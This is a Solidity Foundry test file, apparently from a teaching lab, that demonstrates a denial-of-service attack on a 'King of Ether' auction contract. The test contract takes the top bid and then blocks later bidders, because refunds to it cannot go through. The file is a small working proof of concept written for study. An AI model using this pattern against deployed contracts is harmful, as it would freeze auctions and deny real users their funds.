// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/DoS.sol";

contract DenialOfServiceTest is Test {

    DenialOfService public denialofservice;
    address private attacker;
    address private someUser;

    function setUp () public {
        denialofservice = new DenialOfService ();

        vm.label(address (denialofservice), "DoS Contract");

        //I have used the 5th and 9th dummy address for this test.
        //seems illogical but when I use address(1), 
        //I run into the EvmError::ecrecover problem

        vm.label (attacker, "Attacker");
        attacker = address(5);
        vm.deal(attacker, 100 ether);

        vm.label (someUser, "someUser");
        someUser = address(9);
        vm.deal(someUser, 100 ether);

        vm.label (address(this), "Attacking SMC");
        vm.deal (address(this), 100 ether);
    }

    function isWorking () private {
        vm.startPrank (attacker);

        uint currentBid = denialofservice.highestBid();
        uint newBid = currentBid + 1 ether;
        denialofservice.bid{value: newBid} ();
        assertEq(denialofservice.KingOfEther(), attacker);
        assertEq (denialofservice.highestBid(), newBid);
        
        vm.stopPrank();
    }

    function testExploit() public {
        isWorking();

        uint currentBid = denialofservice.highestBid();
        uint newBid = currentBid + 1 ether;
        emit log_address(denialofservice.KingOfEther());

        vm.startPrank(address(this));
        denialofservice.bid{value: newBid}();
        vm.stopPrank();

        emit log_address(denialofservice.KingOfEther()); 
        validation(newBid); 
    }

    function validation(uint _newBid) private {
        if (
            denialofservice.KingOfEther() == address(this) &&
            denialofservice.highestBid() == _newBid
        ){
            emit log_string ("Your Attack contract is now the King of Ether!!!");

            emit log_string ("Testing DOS Attack");

            vm.startPrank(someUser);
            uint currentBid = denialofservice.highestBid();
            uint newBid = currentBid + 1 ether;
            (bool result, ) = address(denialofservice).call{value: newBid}("bid()");
            if (result == false) {
                emit log_string ("Attacking SMC will remain the King of Ether!!!");
            }else{
                emit log_string ("You do not understand the DoS Attack Yet!!!");
            }

            vm.stopPrank();
        }
    }

}
